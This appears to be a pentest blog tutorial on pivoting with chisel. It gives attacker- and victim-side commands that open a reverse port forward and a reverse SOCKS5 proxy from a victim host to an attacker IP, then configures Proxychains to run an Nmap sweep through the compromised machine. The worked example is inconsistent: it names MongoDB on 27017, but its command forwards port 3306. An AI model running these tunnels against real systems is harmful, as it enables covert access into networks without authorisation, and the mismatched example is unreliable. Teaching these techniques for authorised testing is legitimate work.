soc# Port Forwarding

Port forwarding with `chisel` is quite simple. For example, if you discovered an open MongoDB service running on a remote computer and wanted to forward traffic from a local port to that remote MongoDB service. Here’s how you could achieve that with `chisel` :

## On the Attacking Machine

chisel server -p 3477 --reverse

-   `server`: run the server mode
-   `-p` : port for the server to listen on
-   `--reverse`: allows reverse port forwarding

## On the Victim Machine

chisel client 13.37.13.37:3477 R:2222:127.0.0.1:3306/tcp

-   `client` : run the client mode
-   `13.37.13.37:3477` : the IP address of the attacker’s machine and the port that was specified in the `chisel server` command
-   `R:2222:127.0.0.1:27017/tcp`: the `R` means we want to perform a reverse port forward; `2222` is the port number we want to use to route traffic through on the attacker’s machine; `127.0.0.1:27017` is the IP address/port we want to route our traffic to on the client’s machine; `/tcp` means we want to use the TCP protocol.

The previous commands will allow us to access the MongoDB service running locally on the remote machine on port 2222 on the attacking machine.

Now that we’ve seen how to perform a port forward with `chisel`, let’s create a SOCKS proxy so that we can route all of our traffic with the victim machine.

# SOCKS Proxies

SOCKS proxies capabilities was a recent addition to `chisels` capabilities which I think is awesome. Creating a SOCKS is extremely useful during a pentest, for example, because you can use a tool like Proxychains to route all of the traffic from your attacker tools through the victim’s machine — effectively making it appear as if traffic were originating from the victim’s machine. Here’s how we can set up a SOCKS proxy with `chisel`:

## On the Attack Machine

chisel server -p 3477 --socks5 --reverse

-   `-p`: port for the server to listen on
-   `--socks5`: start an internal SOCKS5 proxy
-   `--reverse`: allows for reverse port forwarding

## On the Victim Machine

chisel client 13.37.13.37:3477 R:5000:socks

-   `13.37.13.37:3477` : the IP address of the attacker machine and the port number specified in the `chisel server` command
-   `R:5000:socks:`the `R` means we want to perform a reverse port forward; `5000` will be the port on the attacker machine that will act as the entry point to our SOCKS5 proxy; and `socks` simply means we are using the SOCKS protocol.

## Proxychains

Configuring Proxychains to use our accessible SOCKS proxy simply requires that we add an entry to the bottom of `/etc/proxychains.conf` under `[ProxyList]` section. We need to specify the IP address and port of the SOCKS proxy we want to route our traffic through. In this case, we want to specify `socks5 127.0.0.1 5000` since our SOCKS proxy is listening on localhost port 5000:

![](https://miro.medium.com/max/700/1*mhBYMO2hZA0ZM5sCgwebLQ.png)

Now we can run the following command on the attacker machine to run Nmap through the victim's machine:

proxychains -q nmap -T4 -sn 10.10.10.0/24

And that’s all you need to know to harness the power of `chisel` — Happy Hacking!